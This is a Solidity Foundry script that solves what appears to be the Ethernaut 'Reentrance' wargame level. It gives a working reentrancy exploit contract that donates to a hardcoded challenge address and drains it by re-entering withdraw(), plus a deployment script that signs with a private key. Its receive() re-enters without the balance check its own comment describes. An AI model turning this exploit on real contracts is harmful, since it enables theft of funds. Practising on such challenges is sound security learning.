// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "../src/Reentrance.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

/*
    The goal of this level is for you to steal all the funds from the contract.



    Solution: Reentrancy
    The Reentrancy contract doesn't follow the Checks-Effects-Interactions pattern
    It doesn't update our balance before transferring allowing us to withdraw more than our balance

    1. Find balance of Reentrancy contract
    2. Create a contract that donates to the Reentrancy contract
    3. Withdraw from the contract
    4. In the attacking contract have a receive function with an if statement
    5. If the Reentrancy contract balance > 0: Call withdraw again

 */
contract ReentraceSolution {

    uint256 amount;
    Reentrance reentrance = Reentrance(payable(0xc47878C031c5E61B0520f5bcF18D9bEa40B30322));

    constructor() public payable {
        amount = address(reentrance).balance;
        reentrance.donate{value:amount}(address(this));
    }

    function withdraw() public payable {
        reentrance.withdraw(amount);
        (bool result,) = msg.sender.call{value:amount*2}("");
    }

    receive() external payable {
        reentrance.withdraw(amount);
    }
}

contract ReentrancySolution is Script {

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        ReentraceSolution reentranceSolution = new ReentraceSolution{value:0.001 ether}();
        reentranceSolution.withdraw();
        vm.stopBroadcast();
    }
}